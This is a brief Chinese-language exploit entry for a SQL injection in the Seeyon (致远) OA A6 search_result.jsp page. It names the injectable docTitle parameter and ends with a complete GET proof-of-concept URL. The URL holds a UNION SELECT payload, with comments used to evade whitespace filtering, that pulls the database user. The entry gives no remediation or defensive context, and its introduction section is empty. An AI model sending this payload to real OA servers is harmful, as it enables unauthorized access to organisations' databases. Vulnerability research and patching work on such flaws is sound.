致远OA A6 search\_result.jsp sql注入漏洞
========================================

一、漏洞简介
------------

二、漏洞影响
------------

致远OA A6

三、复现过程
------------

##### 漏洞位置:

    /yyoa/oaSearch/search_result.jsp

##### 漏洞详情:

    版本：A6
    注意：需登录账户
    注入发生在search_result.jsp文件中的docTitle参数

##### 请求方式:

    Get

##### POC:

    http://www.0-sec.org/yyoa/oaSearch/search_result.jsp?docType=协同信息&docTitle=1'and/**/1=2/**/ union/**/all/**/select/**/user(),2,3,4,5%23&goal=1&perId=0&startTime=&endTime=&keyword=&searchArea=notAr
